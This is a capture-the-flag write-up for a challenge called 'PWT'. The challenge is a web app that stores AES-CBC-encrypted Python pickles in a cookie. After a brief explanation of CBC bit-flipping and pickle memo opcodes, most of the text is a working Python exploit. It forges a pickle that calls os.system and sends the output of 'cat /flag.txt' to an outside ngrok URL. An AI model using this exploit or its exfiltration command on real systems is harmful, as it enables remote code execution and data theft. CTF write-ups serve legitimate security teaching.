# PWT

Introducing better JWT alternative, Pickle Web Token!

## Description

Escape from prolog!

## Writeup

PWT uses AES CBC mode. Hence, you can use CBC bitflip attack to inject at most 15 bits to the pickle payload.

`pickle.dumps` adds `MEMOIZE` opcode every time it pushes something. You can push the memoized value to stack with `BINGET` opcode.  

```python
import requests
from base64 import b64encode, b64decode
import pickle
from struct import pack

URL = "http://localhost:8000/"
EVIL = "https://xxx.ngrok.app/"

payload = (
    pickle.GLOBAL + b"os\nsystem\n" +
    pickle.BINGET + pack('b', 0) + 
    pickle.TUPLE1 +
    pickle.REDUCE + 
    b"\x01"
)
assert len(payload) <= 16
expected = (
    pickle.MEMOIZE +
    pickle.TUPLE2 +
    pickle.MEMOIZE +
    pickle.STOP +
    b"\x0c" * 0x0c
)

s = requests.session()

cmd = "cat /flag.txt"
code = f"python -c \"from urllib.request import urlopen;import os;urlopen('{EVIL}',data=os.popen('{cmd}').read().encode())\""
r = s.post(URL + "register", data={
    "username": code + " " * (16 - (len(code) % 16))
})
print(r.status_code)
print(r.text)
pkl = bytearray(b64decode(s.cookies["pkl"].encode()))

for i in range(len(payload)):
    pkl[i + (len(code)//16)*16 + 48] ^= expected[i] ^ payload[i]

del s.cookies["pkl"]
s.cookies["pkl"] = b64encode(pkl).decode()
r = s.get(URL)
print(r.status_code)
print(r.text)
```